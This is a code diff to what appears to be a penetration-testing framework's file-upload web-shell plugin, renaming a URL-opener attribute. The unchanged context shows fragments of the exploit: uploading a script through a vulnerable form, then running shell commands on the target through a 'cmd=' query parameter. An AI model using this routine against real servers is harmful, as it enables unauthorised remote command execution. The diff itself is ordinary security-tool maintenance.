@@ -108,7 +108,7 @@ class fileUploadShell(baseAttackPlugin):
             
             # Set shell parameters
             shell_obj = fuShell( vuln_obj )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             shell_obj.setExploitURL( self._exploit )
             return shell_obj
         else:
@@ -139,7 +139,7 @@ class fileUploadShell(baseAttackPlugin):
             for file_var_name in vuln_obj['fileVars']:
                 # the [0] was added here to support repeated parameter names
                 exploit_dc[file_var_name][0] = file_handler
-            http_method = getattr( self._urlOpener,  method)
+            http_method = getattr( self._uri_opener,  method)
             response = http_method( vuln_obj.getURL() ,  exploit_dc )
             
             # Call the uploaded script with an empty value in cmd parameter
@@ -147,7 +147,7 @@ class fileUploadShell(baseAttackPlugin):
             dst = vuln_obj['fileDest']
             self._exploit = dst.getDomainPath().urlJoin( self._file_name )
             self._exploit.querystring = u'cmd='
-            response = self._urlOpener.GET( self._exploit )
+            response = self._uri_opener.GET( self._exploit )
             
             # Clean-up
             file_handler.close()
@@ -264,7 +264,7 @@ class fuShell(exec_shell):
         '''
         to_send = self.getExploitURL()
         to_send.querystring = u'cmd=' + command
-        response = self._urlOpener.GET( to_send )
+        response = self._uri_opener.GET( to_send )
         return response.getBody()
         
     def end( self ):
